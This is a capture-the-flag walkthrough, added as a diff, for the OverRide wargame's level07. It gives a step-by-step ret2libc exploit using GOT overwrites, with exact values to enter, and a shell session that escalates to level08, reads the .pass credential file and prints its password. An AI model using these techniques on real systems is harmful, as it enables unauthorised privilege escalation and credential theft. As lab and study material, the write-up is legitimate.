@@ -1,0 +1,61 @@
+The program takes two args. The first arg asks for a number and the second asks for the index were to store the number.
+Our index is submit to some operations that change its value at some point in the program.
+There is a function called "store_number" that store the number into an address. This address is the result of operations
+on our Index.
+The issue with this program is that we can modify the address where is stored "Number" with the result of the calculation
+of our "Index".
+The idea to get a shell is to do a ret2libc exploit. In order to do this, we will modify the arg of the memset function with "sh",
+then write on the GOT addres of memset the address of sysem funcion. And finally make the program restart by writting 
+the main+6 address on the GOT of printf so that the command "system("sh")" will give us a shell with level08 permissions.
+
+
+Because the program reserves 4 bytes storage every 8 bytes we need to modify the len of environements variables so that we can
+modify the GOT of printtf and the GOT of memesett in the same execution.
+
+$> export TESTEST=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+What we need (Every time we store Number into the address pointed by Index):
+
+1)
+- Number: 0x68732F2F (1752379183) This is the future arg for system function. "//sh"
+- Index : 1073742050 This is the index that correspond to $ebp+12, the fist element that is checked by memset
+
+2)
+$> (gdb) p systetm
+0xF7E6AED0 (4159090384)
+- Number: 4159090384 This is the address of system
+- Index: 33632971 This the GOT address of the memset function
+
+3)
+- Number: 0x8048729 (134514473) This the address of main+6
+- Index: 33632963 This the GOT address of the printf function
+
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 1752379183
+ Index: 1073742050
+ Completed store command successfully
+Input command: store
+ Number: 4159090384
+ Index: 33632971
+ Completed store command successfully
+Input command: store
+ Number: 134514473
+ Index: 33632963
+$ id
+uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
+$ cd ..
+$ cd level08
+$ cat .pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
